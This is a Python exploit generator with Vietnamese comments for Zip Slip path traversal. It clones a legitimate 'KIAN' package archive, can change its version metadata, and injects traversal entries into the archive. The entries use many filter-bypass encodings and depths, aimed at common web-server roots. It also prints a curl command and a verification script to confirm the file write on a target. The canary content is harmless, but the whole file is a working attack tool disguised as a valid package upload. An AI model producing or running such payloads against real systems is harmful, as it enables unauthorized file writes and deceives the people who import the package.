"""
Zip Slip payload — copy toàn bộ cấu trúc KIAN gốc + nhét entry path traversal.
ZIP trông hợp lệ 100%, chỉ khác là có thêm file độc hại bên trong.

Usage:
    python zipslip_full.py
    python zipslip_full.py --source "C:\\Users\\Lenovo\\Downloads\\KIAN 2.0.3.zip" --webroot /var/www/html --output payload.zip
"""

import zipfile
import argparse
import json
import os
import itertools
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")

CANARY_FILENAME = "zipslip_probe.txt"
CANARY_CONTENT  = b"ZIPSLIP_CONFIRMED\n"

TRAVERSAL_PATTERNS = [
    "../",           # chuẩn
    "..\\",          # Windows separator
    "..%2F",         # URL encode 1 lần
    "..%252F",       # URL encode 2 lần
    "....//",        # bypass filter strip "../"
    "\x2e\x2e/",    # hex dot
]
DEPTHS = list(range(2, 12))  # depth 2 → 11

DEFAULT_WEBROOTS = [
    "/var/www/html",
    "/var/www",
    "/opt/kian/app/static",
    "/opt/kian/public",
    "/opt/kian/web",
    "/opt/kian/webapp",
    "/usr/share/nginx/html",
    "/app/static",
    "/app/public",
    "/webapps/ROOT",
    "/opt/tomcat/webapps/ROOT",
    "/usr/local/tomcat/webapps/ROOT",
]


def collect_source_files_from_dir(source_dir: str) -> list[tuple[str, bytes]]:
    result = []
    for dirpath, _, filenames in os.walk(source_dir):
        for fname in filenames:
            abs_path = os.path.join(dirpath, fname)
            rel = os.path.relpath(abs_path, source_dir).replace("\\", "/")
            with open(abs_path, "rb") as fh:
                result.append((rel, fh.read()))
    return result


def collect_source_files_from_zip(zip_path: str) -> list[tuple[str, bytes]]:
    result = []
    with zipfile.ZipFile(zip_path, "r") as src:
        all_names = [i.filename for i in src.infolist() if not i.is_dir()]

        # Phát hiện top-level prefix (vd: "KIAN 2.0.3/") để strip ra
        # → đảm bảo metadata.json nằm ở root trong ZIP output
        prefix = ""
        roots = {n.split("/")[0] for n in all_names if "/" in n}
        flat  = [n for n in all_names if "/" not in n]
        if not flat and len(roots) == 1:
            prefix = roots.pop() + "/"
            print(f"[*] Detected zip prefix: '{prefix}' — sẽ strip khi copy")

        for item in src.infolist():
            if item.is_dir():
                continue
            arc_name = item.filename
            if prefix and arc_name.startswith(prefix):
                arc_name = arc_name[len(prefix):]
            if arc_name:
                result.append((arc_name, src.read(item.filename)))
    return result


def collect_source_files(source: str) -> list[tuple[str, bytes]]:
    """Đọc file gốc từ thư mục hoặc file .zip thực sự."""
    if os.path.isdir(source):
        return collect_source_files_from_dir(source)
    if os.path.isfile(source) and source.lower().endswith(".zip"):
        return collect_source_files_from_zip(source)
    return []


def build_traversal_entries(webroots: list[str]) -> list[tuple[str, bytes]]:
    """Tạo tất cả entry path traversal (arc_name, content)."""
    entries = []
    seen = set()
    for pattern, depth, webroot in itertools.product(TRAVERSAL_PATTERNS, DEPTHS, webroots):
        traversal = pattern * depth
        root = webroot.lstrip("/\\").replace("\\", "/")
        arc_name = f"{traversal}{root}/{CANARY_FILENAME}"
        if arc_name not in seen:
            seen.add(arc_name)
            entries.append((arc_name, CANARY_CONTENT))
    return entries


def generate(source: str, output: str, webroots: list[str], args_version: str = "", no_traversal: bool = False):
    source_files = collect_source_files(source)
    traversal_entries = [] if no_traversal else build_traversal_entries(webroots)

    print(f"[*] Source files     : {len(source_files)} files từ {source}")
    if no_traversal:
        print(f"[*] Mode             : CLEAN (không có traversal — dùng để test base import)")
    else:
        print(f"[*] Traversal entries: {len(traversal_entries)} variants")
    print(f"[*] Output           : {output}\n")

    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:

        # 1. Copy toàn bộ file gốc, override metadata.json nếu cần
        for arc_name, data in source_files:
            if arc_name == "metadata.json" and args_version:
                meta = json.loads(data.decode())
                meta["version"] = args_version
                data = json.dumps(meta, ensure_ascii=False).encode()
                print(f"[*] metadata.json version → {args_version}")
            info = zipfile.ZipInfo(arc_name)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, data)

        # 2. Thêm entry path traversal
        for arc_name, content in traversal_entries:
            info = zipfile.ZipInfo(arc_name)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, content)

    size = os.path.getsize(output)
    print(f"[+] Done: {output} ({size / 1024:.1f} KB)\n")

    print("=" * 60)
    print("Sau khi import, verify bằng curl:\n")
    print(f"    curl http://TARGET/{CANARY_FILENAME}")
    print()
    print("Nếu trả về 'ZIPSLIP_CONFIRMED' → VULNERABLE\n")
    fn = CANARY_FILENAME
    print("Hoặc chạy verify script:")
    verify = """
import requests, urllib3
urllib3.disable_warnings()

TARGET = "http://TARGET"   # <-- đổi URL thực
FNAME  = \"""" + fn + """\"
CHECK_PATHS = [
    "/" + FNAME, "/static/" + FNAME, "/public/" + FNAME,
    "/app/" + FNAME, "/assets/" + FNAME, "/web/" + FNAME,
]

for path in CHECK_PATHS:
    try:
        r = requests.get(TARGET + path, timeout=5, verify=False)
        if r.status_code == 200 and b"ZIPSLIP_CONFIRMED" in r.content:
            print("[!!!] CONFIRMED: " + TARGET + path)
            break
        print("[ ]  " + str(r.status_code) + " " + path)
    except Exception as e:
        print("[ERR] " + path + ": " + str(e))
"""
    print(verify)


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    # Ưu tiên: thư mục kian/ → kian.zip → báo lỗi
    if os.path.isdir(os.path.join(script_dir, "kian")):
        default_source = os.path.join(script_dir, "kian")
    else:
        default_source = os.path.join(script_dir, "kian.zip")

    parser = argparse.ArgumentParser(description="Zip Slip full payload — copy KIAN gốc + path traversal")
    parser.add_argument("--source",  default=default_source,
                        help=f"Thư mục KIAN gốc (default: {default_source})")
    parser.add_argument("--output",  default="zipslip_full.zip",
                        help="Tên file ZIP đầu ra (default: zipslip_full.zip)")
    parser.add_argument("--webroot", default=None,
                        help="Chỉ định 1 web root cụ thể (mặc định thử nhiều path)")
    parser.add_argument("--version", default="2.0.5",
                        help="Version ghi vào metadata.json (default: 2.0.5)")
    parser.add_argument("--no-traversal", action="store_true",
                        help="Tạo ZIP sạch không có traversal entries (để test base import)")
    args = parser.parse_args()

    is_dir  = os.path.isdir(args.source)
    is_zip  = os.path.isfile(args.source) and args.source.lower().endswith(".zip")
    if not is_dir and not is_zip:
        print(f"[ERR] Không tìm thấy source: {args.source}")
        print(f"      Truyền --source với đường dẫn đến thư mục hoặc file .zip gốc của KIAN.")
        raise SystemExit(1)

    print(f"[*] Mode: {'directory' if is_dir else 'zip file'}")
    webroots = [args.webroot] if args.webroot else DEFAULT_WEBROOTS
    no_traversal = getattr(args, 'no_traversal', False)
    generate(args.source, args.output, webroots, args_version=args.version, no_traversal=no_traversal)


if __name__ == "__main__":
    main()
